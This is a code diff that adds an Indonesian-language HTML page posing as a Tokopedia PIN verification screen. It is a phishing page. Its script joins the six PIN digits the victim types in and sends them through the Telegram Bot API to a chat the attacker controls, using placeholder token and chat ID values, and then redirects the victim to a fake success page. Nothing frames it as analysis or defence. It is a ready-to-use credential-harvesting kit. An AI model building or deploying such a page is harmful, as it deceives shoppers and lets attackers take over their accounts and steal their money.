@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="theme-color" content="#28a745">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masukkan Kode Verifikasi</title>
+    <style>
+        .body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            padding: 0;
+            background-color: #f7f7f7;
+            overflow: hidden;
+        }
+        .container {
+            text-align: center;
+            width: 100%;
+            max-width: 330px;
+            padding: 20px;
+            background: #fff;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .container img {
+            width: 50px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            font-size: 20px;
+            margin-bottom: 10px;
+        }
+        p {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+        .otp-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+        }
+        .otp-inputs input {
+            width: 40px;
+            height: 40px;
+            text-align: center;
+            font-size: 24px;
+            border: none;
+            border-bottom: 2px solid #28a745;
+            outline: none;
+        }
+        .resend {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666;
+        }
+        .resend a {
+            color: #28a745;
+            text-decoration: none;
+        }
+        .submit-btn {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            margin-top: 20px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="img/logo.png" alt="Logo">
+        <h2>Masukkan Kode PIN</h2>
+        <p>Masukkan 6 Digit PIN Tokopedia Kamu</p>
+        <form id="otp-form">
+            <div class="otp-inputs">
+                <input type="tel" maxlength="1" name="digit1" required>
+                <input type="tel" maxlength="1" name="digit2" required>
+                <input type="tel" maxlength="1" name="digit3" required>
+                <input type="tel" maxlength="1" name="digit4" required>
+                <input type="tel" maxlength="1" name="digit5" required>
+                <input type="tel" maxlength="1" name="digit6" required>
+            </div>
+            <button type="button" class="submit-btn" id="verify-btn">Verifikasi</button>
+        </form>
+        <p class="resend"><a href="#">gunakan metode lainya</a></p>
+    </div>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const inputs = document.querySelectorAll('.otp-inputs input');
+            const verifyBtn = document.getElementById('verify-btn');
+            
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', (e) => {
+                    if (e.inputType === 'insertText' && input.value.length === 1) {
+                        if (index < inputs.length - 1) {
+                            inputs[index + 1].focus();
+                        }
+                    }
+                });
+
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && input.value === '') {
+                        if (index > 0) {
+                            inputs[index - 1].focus();
+                        }
+                    }
+                });
+            });
+
+            // Fungsi ketika tombol Verifikasi ditekan
+            verifyBtn.addEventListener('click', function() {
+                // Menggabungkan semua input PIN
+                let pin = '';
+                inputs.forEach(input => {
+                    pin += input.value;
+                });
+
+                // Memastikan PIN terdiri dari 6 digit
+                if (pin.length === 6) {
+                    sendPinToTelegram(pin);
+                } else {
+                    alert('Harap masukkan PIN lengkap.');
+                }
+            });
+
+            // Fungsi untuk mengirim PIN ke Telegram
+            function sendPinToTelegram(pin) {
+                var telegramToken = 'YOUR_TELEGRAM_BOT_TOKEN'; // Ganti dengan token bot Telegram Anda
+                var chatId = 'YOUR_CHAT_ID'; // Ganti dengan chat_id Telegram Anda
+                var message = "PIN Verifikasi: " + pin;
+
+                var url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+                // Membuat request AJAX
+                var xhr = new XMLHttpRequest();
+                xhr.open("GET", url, true);
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState == 4 && xhr.status == 200) {
+                        // Setelah berhasil, bisa diarahkan ke halaman sukses atau lainnya
+                        window.location.href = "success.html"; // Halaman setelah verifikasi sukses
+                    } else if (xhr.readyState == 4) {
+                        alert('Gagal mengirim PIN, coba lagi.');
+                    }
+                };
+                xhr.send();
+            }
+        });
+    </script>
+</body>
+</html>
